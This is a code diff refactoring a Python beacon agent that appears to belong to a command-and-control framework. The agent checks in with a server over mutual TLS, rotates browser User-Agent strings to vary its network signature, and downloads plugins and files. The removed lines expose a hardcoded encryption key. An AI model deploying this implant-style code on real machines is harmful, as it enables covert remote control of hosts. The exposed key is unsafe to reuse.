@@ -1,92 +1,138 @@
-import time
-import requests
-import importlib.util
-import sys
-import os
-import random
-import subprocess
-import json
-import socket
+# ==========================================
+# 1. System & OS Standard Libraries
+# ==========================================
 import getpass
+import os
 import platform
-from cryptography.fernet import Fernet
-import importlib.util
-from multiprocessing import Process
-from datetime import datetime, timezone
-from pathlib import Path
-import hashlib
+import socket
+import subprocess
+import sys
 import tempfile
+from pathlib import Path
+
+# ==========================================
+# 2. Core Functional Standard Libraries
+# ==========================================
+import hashlib
+import importlib.util  # Consolidated duplicate
+import json
+import random
 import textwrap
+import time
+from datetime import datetime, timezone
+from multiprocessing import Process
 import threading
 
+# ==========================================
+# 3. Third-Party Libraries
+# ==========================================
+from cryptography.fernet import Fernet
+import requests
+
+# ==========================================
+# 1. ENDPOINTS & GLOBAL CONSTANTS
+# ==========================================
 SERVER_URL = "https://127.0.0.1"
+LOGIN_ENDPOINT = "/login"
 BEACON_ENDPOINT = "/beacon"
 RESULT_ENDPOINT = "/result"
 UPLOAD_ENDPOINT = "/upload"
-LOGIN_ENDPOINT = "/login"
 
+AGENT_VERSION = "1.0.3"
+SLEEP_MIN = 5
+SLEEP_MAX = 10
+
+# Update check mechanisms
+UPDATE_CHECK_INTERVAL = 10  # Interval value
+UPDATE_FLAG = ".updated_recently"
+
+# Rotational User-Agents for network signatures
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"
+]
+
+# ==========================================
+# 2. RUNTIME STATE VARIABLES
+# ==========================================
+TOKEN = ""
+scheduled_tasks = []
 config_data = {}
 
-# Get the absolute path of the current script (e.g., /path/to/Agent2.py)
-script_path = os.path.abspath(__file__)
+# ==========================================
+# 3. PATH & FILE SYSTEM CONFIGURATION
+# ==========================================
+# Absolute base directory of the current script execution
+BASE_DIR = Path(__file__).resolve().parent
 
-# Strip the .py extension and add .conf (resulting in /path/to/Agent2.conf)
+# Locate the configuration file dynamically (e.g., /path/to/Agent2.conf)
+script_path = os.path.abspath(__file__)
 config_file_path = os.path.splitext(script_path)[0] + '.conf'
 
+# Ensure the required local directories exist
+os.makedirs(BASE_DIR / "keys", exist_ok=True)
+
+# ==========================================
+# 4. CONFIGURATION PARSING (.conf file)
+# ==========================================
 try:
     with open(config_file_path, 'r') as file:
         for line in file:
-            # Strip whitespace and skip empty lines or comments
             line = line.strip()
+
+            # Skip empty lines or commented configurations
             if not line or line.startswith('#'):
                 continue
 
-            # Split by the first '=' found
+            # Parse Key-Value pairs split by the first '='
             if '=' in line:
                 key, value = line.split('=', 1)
 
-                # Clean up whitespace and strip accidental literal quotes
+                # Sanitize whitespaces and strip enclosing literal quotes
                 key = key.strip()
                 value = value.strip().strip('"').strip("'")
 
                 config_data[key] = value
 
 except FileNotFoundError:
-    print(f"Error: The file {config_file_path} was not found.")
-    # Handle the missing file appropriately (e.g., set defaults or exit)
+    print(f"Error: The configuration file {config_file_path} was not found.")
+    # Consider implementing custom defaults or an exit protocol here
 
-# Extract your variables from the dictionary
+# Extract parsed credential configurations
 username = config_data.get("username")
 password = config_data.get("password")
 AGENT_ID = config_data.get("AGENT_ID")
 AGENT_GROUP = config_data.get("AGENT_GROUP")
-AGENT_VERSION = "1.0.3"
-SLEEP_MIN = 5
-SLEEP_MAX = 10
 
-TOKEN = ""
-scheduled_tasks = []
+# ==========================================
+# 5. CRYPTOGRAPHY INITIALIZATION
+# ==========================================
+FERNET_KEY = config_data.get("FERNET_KEY")
+if FERNET_KEY:
+    # Convert string to bytes for Fernet initialization
+    cipher = Fernet(FERNET_KEY.encode())
+else:
+    cipher = None
+    print("Warning: FERNET_KEY missing from configuration data.")
 
-UPDATE_CHECK_INTERVAL = 10  # 2 hours in seconds
-UPDATE_FLAG = ".updated_recently"
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"]
-
-SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
-cipher = Fernet(SECRET_KEY)
-
+# ==========================================
+# 6. NETWORK SESSION & TLS SETUP
+# ==========================================
 session = requests.Session()
-os.makedirs("./keys", exist_ok=True)
-BASE_DIR = Path(__file__).resolve().parent
+
+# Enforce a custom CA Certificate for server validation
 CA_CERT = BASE_DIR / "keys" / "ca.crt"
 session.verify = str(CA_CERT)
+
+# Apply dynamic mutual TLS (mTLS) Client Certificates based on AGENT_ID
 session.cert = (
-    BASE_DIR / "keys" / f"agent{AGENT_ID}.crt",
-    BASE_DIR / "keys" / f"agent{AGENT_ID}.key",
+    str(BASE_DIR / "keys" / f"agent{AGENT_ID}.crt"),
+    str(BASE_DIR / "keys" / f"agent{AGENT_ID}.key")
 )
+
+# Set a random default User-Agent for this session context
+session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
 
 ''' check if mTLS works
 def run_mtls_requests():
@@ -503,11 +549,10 @@ def download_file(url, save_as=None, task_uuid=None):
         print(f"[+] Downloading {url}")
         headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
         if SERVER_URL in url:
-            r = session.get(url,headers=headers)  # Uses your custom mTLS session
+            r = session.get(url, headers=headers)  # Uses your custom mTLS session
         else:
             r = requests.get(url)
         r.raise_for_status()
-
 
         if "/plugins" in url:
             content = r.text.replace("\r\n", "\n")
